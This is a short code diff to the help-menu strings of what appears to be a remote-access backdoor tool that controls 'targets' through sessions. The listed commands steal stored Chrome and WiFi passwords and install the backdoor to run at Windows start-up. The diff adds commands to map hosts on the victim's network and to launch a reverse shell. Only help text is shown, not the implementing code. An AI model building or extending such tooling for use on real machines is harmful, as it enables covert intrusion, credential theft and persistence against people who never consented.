@@ -15,6 +15,8 @@ HELP_TARGET_COMS ='''
       -  chrome-passwords                    --> Fetch all stored chrome passwords
       -  wifi-passwords                      --> Fetch all stored wifi passwords
       -  enable-startup (RegName) (FileName) --> Enable backdoor on Windows start-up
+      -  connected-machines                  --> List all the hosts connected to the same network as the target (and optionaly their names)
+      -  reverse-shell                       --> Start the reverse shell
 '''
 
 HELP = '''
@@ -26,5 +28,5 @@ HELP = '''
       -  clear                               --> Clears the screen
       -  list-targets                        --> List all available targets
       -  session-pick                        --> Shows a menu to pick a target to interact
-      -  using [session ID]                  --> Chooses a target to interact with directly (without using the session-pick menu)
+      -  using [index]                       --> Chooses a target to interact with directly (without using the session-pick menu)
 '''
